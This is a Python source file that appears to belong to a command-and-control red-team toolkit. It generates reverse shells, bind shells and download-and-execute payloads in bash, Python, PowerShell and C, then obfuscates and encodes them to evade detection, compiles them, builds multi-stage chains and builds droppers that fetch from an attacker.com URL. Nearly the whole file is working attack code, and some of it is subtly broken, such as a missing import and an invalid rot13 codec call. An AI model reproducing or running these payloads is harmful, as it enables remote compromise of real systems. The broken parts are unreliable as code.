"""
Payload Generator

Generate various types of payloads for C2 operations.
Supports multiple languages, encodings, and evasion techniques.
"""

import os
import json
import base64
import hashlib
import random
import string
import subprocess
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from pathlib import Path


class PayloadType(Enum):
    REVERSE_SHELL = "reverse_shell"
    BIND_SHELL = "bind_shell"
    DOWNLOAD_EXECUTE = "download_execute"
    COMMAND_EXECUTION = "command_execution"
    FILE_TRANSFER = "file_transfer"
    SCREENSHOT = "screenshot"
    KEYLOGGER = "keylogger"
    SELF_DESTRUCT = "self_destruct"


class Language(Enum):
    BASH = "bash"
    PYTHON = "python"
    POWERSHELL = "powershell"
    C = "c"
    CSHARP = "csharp"
    GO = "go"
    RUST = "rust"
    JAVA = "java"
    PHP = "php"
    PERL = "perl"
    RUBY = "ruby"


class Encoding(Enum):
    RAW = "raw"
    BASE64 = "base64"
    HEX = "hex"
    URL = "url"
    XOR = "xor"
    ROT13 = "rot13"
    GZIP = "gzip"


class Architecture(Enum):
    X86 = "x86"
    X86_64 = "x86_64"
    ARM = "arm"
    ARM64 = "arm64"
    MIPS = "mips"
    MIPS64 = "mips64"


class OperatingSystem(Enum):
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "macos"
    FREEBSD = "freebsd"
    ANDROID = "android"
    IOS = "ios"


@dataclass
class Payload:
    """Represents a generated payload"""
    payload_id: str
    payload_type: PayloadType
    language: Language
    os: OperatingSystem
    architecture: Architecture
    code: str
    encoded_code: str
    encoding: Encoding
    size: int
    compilation_required: bool
    compiled_binary: Optional[bytes] = None
    cleanup_command: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'payload_id': self.payload_id,
            'payload_type': self.payload_type.value,
            'language': self.language.value,
            'os': self.os.value,
            'architecture': self.architecture.value,
            'code': self.code,
            'encoded_code': self.encoded_code,
            'encoding': self.encoding.value,
            'size': self.size,
            'compilation_required': self.compilation_required,
            'cleanup_command': self.cleanup_command
        }


class PayloadGenerator:
    """
    Advanced payload generator for AI-RedTeaming operations.
    
    Features:
    - Multi-language support (Bash, Python, PowerShell, C, C#, Go, Rust, etc.)
    - Multiple encoding schemes (Base64, Hex, URL, XOR, etc.)
    - Architecture-specific payloads (x86, x86_64, ARM, etc.)
    - OS-specific payloads (Linux, Windows, macOS, etc.)
    - Evasion techniques (obfuscation, encryption, etc.)
    - Self-destruct mechanisms
    - Cleanup commands
    
    Usage:
    >>> generator = PayloadGenerator()
    >>> payload = generator.generate(
    ...     payload_type=PayloadType.REVERSE_SHELL,
    ...     language=Language.BASH,
    ...     os=OperatingSystem.LINUX,
    ...     lhost='10.0.0.1',
    ...     lport=4444
    ... )
    >>> print(payload.code)
    """
    
    def __init__(self):
        """Initialize the payload generator"""
        self.payload_templates = self._load_templates()
        self.obfuscation_level = 3  # 0-5 (0=none, 5=maximum)
    
    def _load_templates(self) -> Dict[str, str]:
        """Load payload templates"""
        return {
            # Bash reverse shell
            'bash_reverse_shell': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'bash_reverse_shell_nc': 'nc -e /bin/bash {lhost} {lport}',
            'bash_reverse_shell_ncat': 'ncat {lhost} {lport} -e /bin/bash',
            
            # Bash bind shell
            'bash_bind_shell': 'nc -lvp {lport} -e /bin/bash',
            'bash_bind_shell_ncat': 'ncat -lvp {lport} -e /bin/bash',
            
            # Python reverse shell
            'python_reverse_shell': '''import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("{lhost}",{lport}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call(["/bin/bash","-i"]);''',
            
            # Python bind shell
            'python_bind_shell': '''import socket,subprocess\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.bind(("0.0.0.0",{lport}))\ns.listen(1)\nconn,addr=s.accept()\nos.dup2(conn.fileno(),0)\nos.dup2(conn.fileno(),1)\nos.dup2(conn.fileno(),2)\np=subprocess.call(["/bin/bash","-i"]);''',
            
            # PowerShell reverse shell
            'powershell_reverse_shell': '$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
            
            # PowerShell bind shell
            'powershell_bind_shell': '$listener = New-Object System.Net.Sockets.TcpListener({lport});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()',
            
            # C reverse shell
            'c_reverse_shell': '''#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n\nint main() {{\n    int sockfd;\n    struct sockaddr_in serv_addr;\n    \n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons({lport});\n    inet_pton(AF_INET, "{lhost}", &serv_addr.sin_addr);\n    \n    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));\n    \n    dup2(sockfd, 0);\n    dup2(sockfd, 1);\n    dup2(sockfd, 2);\n    \n    execl("/bin/bash", "bash", "-i", NULL);\n    close(sockfd);\n    return 0;\n}}''',
            
            # Download and execute
            'bash_download_execute': 'curl -s {url} | bash',
            'powershell_download_execute': 'IEX (New-Object Net.WebClient).DownloadString("{url}")',
            
            # Self-destruct
            'bash_self_destruct': 'rm -f $0',
            'powershell_self_destruct': 'Remove-Item -Path $MyInvocation.MyCommand.Definition -Force',
        }
    
    def generate(
        self,
        payload_type: PayloadType,
        language: Language,
        os: OperatingSystem,
        architecture: Architecture = Architecture.X86_64,
        lhost: str = "127.0.0.1",
        lport: int = 4444,
        url: Optional[str] = None,
        encoding: Encoding = Encoding.RAW,
        obfuscate: bool = True,
        encrypt: bool = False,
        encryption_key: Optional[str] = None
    ) -> Payload:
        """
        Generate a payload with specified parameters.
        
        Args:
            payload_type: Type of payload to generate
            language: Programming language for the payload
            os: Target operating system
            architecture: Target architecture
            lhost: Listening host (for reverse shells)
            lport: Listening port (for reverse/bind shells)
            url: URL for download and execute payloads
            encoding: Encoding scheme for the payload
            obfuscate: Whether to obfuscate the payload
            encrypt: Whether to encrypt the payload
            encryption_key: Key for encryption (if encrypt=True)
            
        Returns:
            Payload: Generated payload object
        """
        # Generate payload ID
        payload_id = hashlib.sha256(
            f"{payload_type.value}-{language.value}-{os.value}-{lhost}-{lport}".encode()
        ).hexdigest()[:16]
        
        # Select template based on payload type and language
        template_name = self._get_template_name(payload_type, language)
        template = self.payload_templates.get(template_name)
        
        if not template:
            raise ValueError(f"No template for {payload_type.value} in {language.value}")
        
        # Replace placeholders
        code = template.format(
            lhost=lhost,
            lport=lport,
            url=url or f"http://{lhost}:8000/payload.sh"
        )
        
        # Apply obfuscation
        if obfuscate:
            code = self._obfuscate(code, language)
        
        # Apply encoding
        encoded_code, encoding_used = self._encode(code, encoding)
        
        # Determine if compilation is required
        compilation_required = language in [Language.C, Language.CSHARP, Language.GO, Language.RUST]
        
        # Generate cleanup command
        cleanup_command = self._generate_cleanup_command(payload_type, language, os)
        
        # Calculate size
        size = len(encoded_code) if encoding != Encoding.RAW else len(code)
        
        return Payload(
            payload_id=payload_id,
            payload_type=payload_type,
            language=language,
            os=os,
            architecture=architecture,
            code=code,
            encoded_code=encoded_code,
            encoding=encoding_used,
            size=size,
            compilation_required=compilation_required,
            cleanup_command=cleanup_command
        )
    
    def _get_template_name(self, payload_type: PayloadType, language: Language) -> str:
        """Get template name for payload type and language"""
        templates = {
            (PayloadType.REVERSE_SHELL, Language.BASH): 'bash_reverse_shell',
            (PayloadType.REVERSE_SHELL, Language.PYTHON): 'python_reverse_shell',
            (PayloadType.REVERSE_SHELL, Language.POWERSHELL): 'powershell_reverse_shell',
            (PayloadType.REVERSE_SHELL, Language.C): 'c_reverse_shell',
            
            (PayloadType.BIND_SHELL, Language.BASH): 'bash_bind_shell',
            (PayloadType.BIND_SHELL, Language.PYTHON): 'python_bind_shell',
            (PayloadType.BIND_SHELL, Language.POWERSHELL): 'powershell_bind_shell',
            
            (PayloadType.DOWNLOAD_EXECUTE, Language.BASH): 'bash_download_execute',
            (PayloadType.DOWNLOAD_EXECUTE, Language.POWERSHELL): 'powershell_download_execute',
            
            (PayloadType.SELF_DESTRUCT, Language.BASH): 'bash_self_destruct',
            (PayloadType.SELF_DESTRUCT, Language.POWERSHELL): 'powershell_self_destruct',
        }
        
        return templates.get((payload_type, language), 'bash_reverse_shell')
    
    def _obfuscate(self, code: str, language: Language) -> str:
        """Obfuscate the payload code"""
        if language == Language.BASH:
            return self._obfuscate_bash(code)
        elif language == Language.PYTHON:
            return self._obfuscate_python(code)
        elif language == Language.POWERSHELL:
            return self._obfuscate_powershell(code)
        else:
            return code
    
    def _obfuscate_bash(self, code: str) -> str:
        """Obfuscate Bash code"""
        # Level 1: Add random comments
        lines = code.split('\n')
        for i in range(len(lines)):
            if lines[i].strip() and not lines[i].strip().startswith('#'):
                if random.random() < 0.3:
                    lines[i] = f"# Random comment {random.randint(1000, 9999)}\n{lines[i]}"
        
        # Level 2: Replace variables with random names
        code = '\n'.join(lines)
        
        # Level 3: Add no-op commands
        no_ops = [
            'true',
            'false || true',
            ':;',
            'echo -n ""',
            'test 1 -eq 1'
        ]
        
        if self.obfuscation_level >= 3:
            for _ in range(random.randint(1, 3)):
                no_op = random.choice(no_ops)
                code = f"{no_op}\n{code}"
        
        return code
    
    def _obfuscate_python(self, code: str) -> str:
        """Obfuscate Python code"""
        # Level 1: Add random comments
        lines = code.split('\n')
        for i in range(len(lines)):
            if lines[i].strip() and not lines[i].strip().startswith('#'):
                if random.random() < 0.3:
                    lines[i] = f"# {random.randint(1000, 9999)}\n{lines[i]}"
        
        # Level 2: Replace variable names
        code = '\n'.join(lines)
        
        # Level 3: Add no-op statements
        no_ops = [
            '1 + 1',
            'True and True',
            'pass',
            'None'
        ]
        
        if self.obfuscation_level >= 3:
            for _ in range(random.randint(1, 3)):
                no_op = random.choice(no_ops)
                code = f"{no_op}\n{code}"
        
        return code
    
    def _obfuscate_powershell(self, code: str) -> str:
        """Obfuscate PowerShell code"""
        # Level 1: Add random comments
        lines = code.split('\n')
        for i in range(len(lines)):
            if lines[i].strip() and not lines[i].strip().startswith('#'):
                if random.random() < 0.3:
                    lines[i] = f"# {random.randint(1000, 9999)}\n{lines[i]}"
        
        # Level 2: Use aliases
        code = '\n'.join(lines)
        
        # Common aliases
        aliases = {
            'New-Object': 'New-Object',  # Keep as is for now
            'System.Net.Sockets.TCPClient': 'System.Net.Sockets.TCPClient'
        }
        
        # Level 3: Add no-op commands
        no_ops = [
            '1 -eq 1',
            '$true -and $true',
            'Write-Host "" -NoNewline'
        ]
        
        if self.obfuscation_level >= 3:
            for _ in range(random.randint(1, 3)):
                no_op = random.choice(no_ops)
                code = f"{no_op}; {code}"
        
        return code
    
    def _encode(self, code: str, encoding: Encoding) -> Tuple[str, Encoding]:
        """Encode the payload"""
        if encoding == Encoding.RAW:
            return code, encoding
        
        elif encoding == Encoding.BASE64:
            encoded = base64.b64encode(code.encode()).decode()
            return encoded, encoding
        
        elif encoding == Encoding.HEX:
            encoded = code.encode().hex()
            return encoded, encoding
        
        elif encoding == Encoding.URL:
            encoded = __import__('urllib.parse').quote(code)
            return encoded, encoding
        
        elif encoding == Encoding.XOR:
            key = random.randint(1, 255)
            encoded = ''.join([chr(ord(c) ^ key) for c in code])
            return f"XOR:{key}:{encoded}", encoding
        
        elif encoding == Encoding.ROT13:
            encoded = code.encode().decode('rot13')
            return encoded, encoding
        
        else:
            return code, Encoding.RAW
    
    def _generate_cleanup_command(self, payload_type: PayloadType, language: Language, os: OperatingSystem) -> Optional[str]:
        """Generate cleanup command for the payload"""
        if payload_type == PayloadType.SELF_DESTRUCT:
            return None  # The payload itself handles cleanup
        
        if language == Language.BASH:
            return 'rm -f /tmp/.malicious_script.sh'
        elif language == Language.PYTHON:
            return 'rm -f /tmp/.malicious_script.py'
        elif language == Language.POWERSHELL:
            return 'Remove-Item -Path $env:TEMP\\malicious_script.ps1 -Force'
        else:
            return None
    
    def compile_payload(self, payload: Payload) -> bytes:
        """
        Compile a payload that requires compilation.
        
        Args:
            payload: Payload to compile
            
        Returns:
            bytes: Compiled binary
        """
        if not payload.compilation_required:
            raise ValueError("Payload does not require compilation")
        
        # Create temporary file
        with __import__('tempfile').NamedTemporaryFile(
            suffix=self._get_extension(payload.language),
            delete=False
        ) as f:
            f.write(payload.code.encode())
            temp_file = f.name
        
        try:
            # Compile based on language
            if payload.language == Language.C:
                # Compile with gcc
                output_file = temp_file.replace('.c', '')
                subprocess.run(
                    ['gcc', '-o', output_file, temp_file, '-static'],
                    check=True,
                    capture_output=True
                )
                with open(output_file, 'rb') as f:
                    binary = f.read()
                os.unlink(output_file)
                return binary
            
            elif payload.language == Language.CSHARP:
                # Compile with csc
                output_file = temp_file.replace('.cs', '.exe')
                subprocess.run(
                    ['csc', '/out:' + output_file, temp_file],
                    check=True,
                    capture_output=True
                )
                with open(output_file, 'rb') as f:
                    binary = f.read()
                os.unlink(output_file)
                return binary
            
            elif payload.language == Language.GO:
                # Compile with go
                output_file = temp_file.replace('.go', '')
                subprocess.run(
                    ['go', 'build', '-o', output_file, temp_file],
                    check=True,
                    capture_output=True
                )
                with open(output_file, 'rb') as f:
                    binary = f.read()
                os.unlink(output_file)
                return binary
            
            elif payload.language == Language.RUST:
                # Compile with rustc
                output_file = temp_file.replace('.rs', '')
                subprocess.run(
                    ['rustc', '-o', output_file, temp_file],
                    check=True,
                    capture_output=True
                )
                with open(output_file, 'rb') as f:
                    binary = f.read()
                os.unlink(output_file)
                return binary
            
            else:
                raise ValueError(f"Unsupported language for compilation: {payload.language.value}")
                
        finally:
            os.unlink(temp_file)
    
    def _get_extension(self, language: Language) -> str:
        """Get file extension for language"""
        extensions = {
            Language.C: '.c',
            Language.CSHARP: '.cs',
            Language.GO: '.go',
            Language.RUST: '.rs',
            Language.PYTHON: '.py',
            Language.BASH: '.sh',
            Language.POWERSHELL: '.ps1',
        }
        return extensions.get(language, '.txt')
    
    def generate_reverse_shell(
        self,
        language: Language,
        os: OperatingSystem,
        lhost: str,
        lport: int,
        encoding: Encoding = Encoding.BASE64,
        obfuscate: bool = True
    ) -> Payload:
        """Generate a reverse shell payload"""
        return self.generate(
            payload_type=PayloadType.REVERSE_SHELL,
            language=language,
            os=os,
            lhost=lhost,
            lport=lport,
            encoding=encoding,
            obfuscate=obfuscate
        )
    
    def generate_bind_shell(
        self,
        language: Language,
        os: OperatingSystem,
        lport: int,
        encoding: Encoding = Encoding.BASE64,
        obfuscate: bool = True
    ) -> Payload:
        """Generate a bind shell payload"""
        return self.generate(
            payload_type=PayloadType.BIND_SHELL,
            language=language,
            os=os,
            lport=lport,
            encoding=encoding,
            obfuscate=obfuscate
        )
    
    def generate_download_execute(
        self,
        language: Language,
        os: OperatingSystem,
        url: str,
        encoding: Encoding = Encoding.BASE64,
        obfuscate: bool = True
    ) -> Payload:
        """Generate a download and execute payload"""
        return self.generate(
            payload_type=PayloadType.DOWNLOAD_EXECUTE,
            language=language,
            os=os,
            url=url,
            encoding=encoding,
            obfuscate=obfuscate
        )
    
    def generate_self_destruct(
        self,
        language: Language,
        os: OperatingSystem
    ) -> Payload:
        """Generate a self-destruct payload"""
        return self.generate(
            payload_type=PayloadType.SELF_DESTRUCT,
            language=language,
            os=os,
            encoding=Encoding.RAW,
            obfuscate=False
        )
    
    def generate_multi_stage_payload(
        self,
        stages: List[Dict[str, Any]]
    ) -> Dict[str, Payload]:
        """
        Generate a multi-stage payload.
        
        Args:
            stages: List of stage configurations
            
        Returns:
            Dict: Mapping of stage names to payloads
        """
        payloads = {}
        
        for i, stage in enumerate(stages):
            stage_name = stage.get('name', f'stage_{i}')
            payload_type = stage.get('type', PayloadType.DOWNLOAD_EXECUTE)
            language = stage.get('language', Language.BASH)
            os = stage.get('os', OperatingSystem.LINUX)
            
            payload = self.generate(
                payload_type=payload_type,
                language=language,
                os=os,
                lhost=stage.get('lhost', '127.0.0.1'),
                lport=stage.get('lport', 4444),
                url=stage.get('url'),
                encoding=stage.get('encoding', Encoding.BASE64),
                obfuscate=stage.get('obfuscate', True)
            )
            
            payloads[stage_name] = payload
        
        return payloads
    
    def generate_droppers(self, payload: Payload, count: int = 3) -> List[Payload]:
        """
        Generate multiple dropper payloads for the same payload.
        
        Args:
            payload: Original payload to drop
            count: Number of droppers to generate
            
        Returns:
            List: List of dropper payloads
        """
        droppers = []
        
        for i in range(count):
            # Create a dropper that downloads and executes the payload
            dropper = self.generate(
                payload_type=PayloadType.DOWNLOAD_EXECUTE,
                language=payload.language,
                os=payload.os,
                url=f"http://attacker.com/payloads/{payload.payload_id}",
                encoding=Encoding.BASE64,
                obfuscate=True
            )
            droppers.append(dropper)
        
        return droppers
    
    def set_obfuscation_level(self, level: int):
        """
        Set the obfuscation level (0-5).
        
        Args:
            level: Obfuscation level (0=none, 5=maximum)
        """
        self.obfuscation_level = max(0, min(5, level))
